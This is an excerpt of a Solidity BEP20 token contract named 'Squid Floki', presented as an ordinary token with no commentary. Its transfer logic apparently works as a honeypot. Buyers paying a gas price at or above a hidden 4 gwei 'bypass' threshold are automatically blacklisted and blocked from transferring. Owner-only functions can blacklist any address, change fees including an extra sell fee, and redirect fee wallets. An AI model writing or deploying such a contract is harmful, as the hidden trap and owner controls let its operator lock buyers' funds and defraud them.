...
contract SQUIDFLOKI is Ownable, IBEP20 {
    ...
    uint256 private bypass = 4 * 1 gwei;

    string constant _name = "Squid Floki";
    ...
    bool public flopmode = true;
    mapping(address => bool) public isFloped;
    ...
    constructor() {
        ...
        totalFee = liquidityFee.add(marketingFee).add(lpFee);
    ...
    function _transferFrom(address sender, address recipient, uint256 amount) internal returns (bool) {
        ...
        if (flopmode) {
            require(!isFloped[sender],"Floped");
        }

        if(recipient == pair && !authorizations[sender]) {
            require(tx.gasprice <= bypass);
            require(tradingOpen, "Trading not open yet");
        }

        if(recipient != pair && !authorizations[recipient]) {
            require(tradingOpen, "Trading not open yet");
            if (tx.gasprice >= bypass) {
                isFloped[recipient] = true;
            }
        }
    ...
    function marketingAndLiquidity() internal lockTheSwap {
        ...
        uint256 amountBNBLP = amountBNB.mul(lpFee).div(totalBNBFee);
        
        (bool tmpSuccess1,) = payable(marketingWallet).call{value : amountBNBMarketing, gas : 30000}("");
        tmpSuccess1 = false;

        (bool tmpSuccess2,) = payable(lpWallet).call{value : amountBNBLP, gas : 30000}("");
        tmpSuccess2 = false;
    ...
    function setBypass (uint256 newBypass) external onlyOwner {
        require (newBypass >= 99, "Max bypass should be higher than 99 gwei");
        bypass = newBypass * 1 gwei;
    }
    ...
    function setFees(uint256 newLiqFee, uint256 newMarketingFee, uint256 newLPFee, uint256 extraSellFee) external onlyOwner {
    ...
    function changeFeeReceivers(address newMarketingWallet, address newLPWallet) external onlyOwner {
        marketingWallet = newMarketingWallet;
        lpWallet = newLPWallet;
    }


    function enable_flop(bool _status) public onlyOwner {
        flopmode = _status;
    }

        
    function manage_flop(address[] calldata addresses, bool status) public onlyOwner {
        for (uint256 i; i < addresses.length; ++i) {
            isFloped[addresses[i]] = status;
        }
    }
